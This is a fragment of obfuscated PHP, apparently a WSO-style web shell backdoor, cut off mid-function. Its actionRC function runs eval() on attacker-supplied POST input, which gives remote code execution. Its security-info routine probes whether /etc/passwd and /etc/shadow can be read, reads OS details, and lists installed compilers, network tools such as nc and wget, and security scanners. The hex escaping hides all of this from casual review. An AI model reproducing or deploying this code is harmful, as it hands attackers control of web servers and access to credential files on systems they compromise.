x6bf\x67\x78\x75\x68\x65\x75\x62\x79"]}&0x0200)?"\x74":"x"):((${${"G\x4cO\x42\x41LS"}["k\x66g\x78\x75he\x75\x62\x79"]}&0x0200)?"\x54":"-"));return${$ynimlwfpudwl};}function viewPermsColor($f){${"G\x4cOBALS"}["m\x72\x6d\x65\x63\x65j\x7ax"]="\x66";if(!@is_readable(${${"G\x4c\x4fBAL\x53"}["k\x79r\x79\x70qlxm\x6ft\x64"]}))return"\x3cfon\x74 c\x6fl\x6fr=\x23FF00\x30\x30\x3e<b>".perms(@fileperms(${${"\x47\x4cO\x42\x41\x4c\x53"}["k\x79\x72y\x70\x71l\x78\x6d\x6ft\x64"]}))."\x3c/b\x3e</f\x6fn\x74\x3e";elseif(!@is_writable(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x6byr\x79p\x71l\x78\x6dot\x64"]}))return"\x3cf\x6fnt \x63\x6f\x6co\x72=w\x68\x69\x74\x65\x3e\x3cb>".perms(@fileperms(${${"\x47L\x4fBAL\x53"}["m\x72\x6d\x65c\x65j\x7ax"]}))."\x3c/\x62\x3e</\x66\x6fn\x74\x3e";else return"<f\x6fn\x74\x20co\x6c\x6fr\x3d#FFD\x425\x46><b>".perms(@fileperms(${${"\x47L\x4fB\x41L\x53"}["\x6b\x79\x72ypql\x78\x6d\x6f\x74d"]}))."\x3c/b>\x3c/\x66ont\x3e";}function hardScandir($dir){if(function_exists("s\x63\x61\x6ed\x69r")){${"\x47\x4c\x4f\x42\x41LS"}["\x76el\x71\x78\x62e\x6f\x73m"]="dir";return scandir(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x76\x65\x6cq\x78b\x65\x6f\x73\x6d"]});}else{${"GL\x4f\x42\x41L\x53"}["\x65\x6b\x6f\x62k\x78\x71n\x64"]="\x64\x68";${"GLOB\x41L\x53"}["\x6df\x67\x77\x7ab\x73\x76c\x71"]="\x64\x69r";$gofnmqxbybl="\x66il\x65\x6e\x61\x6d\x65";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x65\x6bo\x62\x6b\x78q\x6ed"]}=opendir(${${"G\x4cO\x42\x41\x4c\x53"}["\x6d\x66g\x77\x7a\x62s\x76cq"]});while(false!==(${${"\x47LOB\x41LS"}["\x6aq\x66\x64\x65\x72\x79u"]}=readdir(${${"\x47\x4c\x4f\x42A\x4cS"}["\x66o\x65\x73\x7a\x76\x71"]})))${${"\x47\x4cOB\x41\x4c\x53"}["y\x78\x65\x61\x73b\x78\x6e"]}[]=${$gofnmqxbybl};return${${"\x47\x4c\x4f\x42AL\x53"}["\x79x\x65\x61s\x62\x78\x6e"]};}}function which($p){${"\x47LOB\x41\x4c\x53"}["\x6e\x69p\x64xyi\x75\x6c"]="p";${"G\x4c\x4fB\x41LS"}["\x62\x76\x69\x70c\x64\x66\x65"]="\x70a\x74h";${"\x47\x4c\x4f\x42\x41L\x53"}["b\x66\x7az\x6av"]="\x70\x61\x74h";${${"\x47LO\x42\x41\x4cS"}["\x66\x68\x64\x6f\x62l\x76"]}=ex("\x77h\x69ch ".${${"\x47\x4c\x4fB\x41\x4cS"}["n\x69p\x64\x78\x79\x69\x75l"]});if(!empty(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x62\x76\x69p\x63\x64\x66\x65"]}))return${${"\x47\x4cO\x42\x41\x4cS"}["\x62\x66\x7azj\x76"]};return false;}function actionRC(){if(!@$_POST["p\x31"]){${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6ax\x79\x62y\x75"]}=array("\x75\x6e\x61m\x65"=>php_uname(),"\x70\x68\x70\x5fv\x65\x72si\x6f\x6e"=>phpversion(),"V\x45RS\x49O\x4e"=>VERSION,"\x73\x61\x66e\x6dod\x65"=>@ini_get("\x73\x61\x66\x65\x5f\x6d\x6fd\x65"));echo serialize(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6ax\x79by\x75"]});}else{eval($_POST["\x70\x31"]);}}function prototype($k,$v){${"\x47\x4cOB\x41\x4c\x53"}["\x63\x70e\x72n\x63s\x78"]="\x6b";$_COOKIE[${${"\x47L\x4fBA\x4c\x53"}["\x76h\x69un\x6b\x76\x6ci\x70\x77"]}]=${${"\x47LO\x42\x41\x4cS"}["eb\x70w\x70y\x6ez\x67l"]};setcookie(${${"\x47\x4cO\x42\x41LS"}["c\x70\x65rn\x63s\x78"]},${${"\x47\x4cOB\x41L\x53"}["ebp\x77\x70\x79nzg\x6c"]});}function actionSecInfo(){hardHeader();echo"\x3ch\x31>\x53\x65\x72\x76e\x72\x20\x73\x65c\x75ri\x74y\x20in\x66o\x72m\x61\x74\x69\x6f\x6e\x3c/h1\x3e<div\x20\x63la\x73\x73\x3d\x63o\x6e\x74\x65nt\x3e";function showSecParam($n,$v){$cuhphxcjq="\x76";${$cuhphxcjq}=trim(${${"\x47L\x4f\x42\x41L\x53"}["\x65bp\x77\x70\x79n\x7a\x67l"]});if(${${"\x47\x4c\x4f\x42AL\x53"}["\x65\x62\x70\x77pyn\x7agl"]}){$vditlolmk="\x6e";echo"<s\x70an>".${$vditlolmk}.": \x3c/sp\x61n\x3e";$owsnhi="\x76";if(strpos(${${"\x47\x4c\x4f\x42\x41\x4cS"}["eb\x70\x77p\x79n\x7a\x67\x6c"]},"\n")===false)echo${${"G\x4cO\x42A\x4c\x53"}["eb\x70\x77p\x79\x6ez\x67\x6c"]}."\x3c\x62r>";else echo"<pre cla\x73s\x3dml1>".${$owsnhi}."</\x70r\x65>";}}showSecParam("\x53e\x72v\x65r s\x6ff\x74ware",@getenv("\x53E\x52VER_S\x4fFTWARE"));if(function_exists("a\x70ache\x5fget_\x6do\x64\x75\x6c\x65s"))showSecParam("Lo\x61\x64\x65d Apa\x63\x68\x65 m\x6f\x64\x75\x6c\x65\x73",implode(",\x20",apache_get_modules()));showSecParam("Disabl\x65d PH\x50 \x46\x75n\x63\x74i\x6f\x6es",$GLOBALS["\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6ec\x74ions"]?$GLOBALS["\x64\x69\x73a\x62\x6c\x65\x5f\x66u\x6e\x63\x74\x69\x6fns"]:"\x6e\x6fne");showSecParam("\x4f\x70e\x6e b\x61s\x65\x20dir",@ini_get("o\x70en\x5fba\x73\x65di\x72"));showSecParam("\x53\x61\x66e m\x6f\x64\x65 \x65xec\x20dir",@ini_get("\x73\x61fe_\x6do\x64e\x5f\x65xec\x5fd\x69\x72"));${"\x47\x4cO\x42\x41\x4c\x53"}["o\x68w\x64\x6c\x68\x78\x6fc"]="\x74\x65\x6d\x70";showSecParam("\x53\x61\x66\x65 \x6d\x6f\x64\x65\x20in\x63\x6cud\x65\x20\x64i\x72",@ini_get("\x73a\x66\x65\x5f\x6d\x6f\x64e_in\x63l\x75\x64e\x5fd\x69r"));showSecParam("cUR\x4c \x73\x75\x70\x70\x6f\x72t",function_exists("\x63u\x72\x6c_\x76\x65r\x73i\x6fn")?"\x65\x6e\x61b\x6ce\x64":"\x6e\x6f");$usucbnkoje="\x74\x65\x6dp";${${"\x47\x4cO\x42\x41LS"}["g\x64nn\x70\x70\x72"]}=array();if(function_exists("m\x79sql\x5fg\x65t\x5f\x63\x6ci\x65n\x74\x5f\x69\x6efo"))${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["oh\x77\x64\x6c\x68\x78oc"]}[]="\x4d\x79Sq\x6c\x20(".mysql_get_client_info().")";${"GL\x4fBAL\x53"}["\x67z\x63e\x64\x6e\x6f\x6e\x6f\x6e"]="temp";if(function_exists("\x6ds\x73\x71l_\x63onne\x63t"))${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x67\x64n\x6ep\x70\x72"]}[]="MSS\x51L";if(function_exists("\x70\x67\x5fcon\x6ee\x63\x74"))${${"G\x4cO\x42\x41\x4c\x53"}["\x67z\x63e\x64\x6e\x6f\x6eon"]}[]="\x50\x6fs\x74\x67r\x65\x53\x51L";if(function_exists("oc\x69_\x63on\x6e\x65\x63t"))${${"\x47L\x4f\x42\x41\x4c\x53"}["\x67\x64\x6e\x6e\x70\x70\x72"]}[]="\x4fra\x63\x6c\x65";showSecParam("\x53upp\x6frt\x65\x64\x20\x64\x61tab\x61ses",implode(", ",${$usucbnkoje}));echo"<br\x3e";if($GLOBALS["os"]=="nix"){showSecParam("Re\x61d\x61b\x6ce\x20/e\x74\x63/p\x61\x73\x73wd",@is_readable("/\x65\x74c/pas\x73w\x64")?"\x79\x65s\x20\x3ca \x68\x72ef='#' \x6fn\x63\x6c\x69ck\x3d'g(\"\x46i\x6c\x65\x73T\x6fol\x73\x22, \"/\x65t\x63/\x22,\x20\x22p\x61s\x73\x77d\x22)\x27\x3e[\x76i\x65\x77]</a\x3e":"n\x6f");showSecParam("\x52e\x61\x64a\x62\x6ce /\x65tc/\x73h\x61d\x6f\x77",@is_readable("/\x65\x74c/\x73h\x61d\x6fw")?"\x79\x65\x73 \x3c\x61 hre\x66=\x27\x23'\x20on\x63\x6cic\x6b\x3d'g(\x22F\x69le\x73To\x6fl\x73\",\x20\"/e\x74c/\x22,\x20\"\x73\x68\x61\x64o\x77\x22)'>[vi\x65w]\x3c/\x61\x3e":"\x6e\x6f");showSecParam("\x4fS\x20\x76\x65\x72\x73i\x6fn",@file_get_contents("/\x70\x72\x6f\x63/\x76\x65\x72\x73\x69on"));showSecParam("D\x69st\x72\x20n\x61me",@file_get_contents("/etc/\x69ssu\x65\x2e\x6eet"));if(!$GLOBALS["sa\x66e\x5f\x6d\x6fde"]){${${"\x47L\x4f\x42A\x4c\x53"}["\x64\x76y\x77\x72v\x64ud\x77"]}=array("gc\x63","lcc","cc","\x6c\x64","\x6d\x61k\x65","\x70hp","\x70e\x72\x6c","\x70y\x74\x68on","ru\x62\x79","tar","\x67\x7a\x69p","b\x7a\x69\x70","\x62zip2","n\x63","lo\x63a\x74\x65","sui\x64\x70e\x72\x6c");${"\x47\x4c\x4f\x42ALS"}["n\x78\x65b\x69\x6egm"]="\x74\x65\x6d\x70";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6f\x77r\x79\x6b\x6a\x6ewf\x63\x67\x6d"]}=array("k\x61v","\x6eo\x64\x332","\x62d\x63o\x72\x65d","\x75v\x73c\x61\x6e","\x73av","\x64r\x77\x65bd","c\x6ca\x6d\x64","rkh\x75\x6ete\x72","\x63hkro\x6f\x74kit","\x69p\x74able\x73","\x69\x70\x66\x77","tri\x70wi\x72\x65","\x73h\x69\x65l\x64c\x63","p\x6fr\x74\x73e\x6e\x74\x72y","s\x6e\x6f\x72\x74","\x6fs\x73\x65c","l\x69ds\x61d\x6d","\x74\x63p\x6co\x64\x67","\x73\x78\x69d","\x6c\x6f\x67\x63heck","\x6c\x6fg\x77\x61\x74c\x68","\x73\x79sm\x61\x73\x6b","\x7a\x6dbsc\x61p","\x73awm\x69ll","wo\x72\x6d\x73\x63\x61\x6e","ni\x6eja");${${"G\x4c\x4f\x42A\x4c\x53"}["v\x74ge\x65w\x75\x64\x6a\x62\x6c\x6e"]}=array("w\x67\x65\x74","f\x65\x74c\x68","lyn\x78","l\x69n\x6b\x73","\x63ur\x6c","\x67\x65t","\x6cwp-m\x69r\x72or");$lrkdpi="\x75\x73\x65r\x66\x75\x6c";echo"\x3cbr>";${${"\x47\x4cO\x42\x41\x4c\x53"}["\x67\x64\x6en\x70\x70r"]}=array();foreach(${$lrkdpi} as$▟){$rsgsjbcp="te\x6d\x70";if(which($▟))${$rsgsjbcp}[]=$▟;}showSecParam("U\x73er\x66\x75\x6c",implode(", ",${${"\x47\x4cO\x42AL\x53"}["\x67\x64n\x6e\x70\x70\x72"]}));${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6e\x78\x65\x62\x69\x6eg\x6d"]}=array();foreach(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x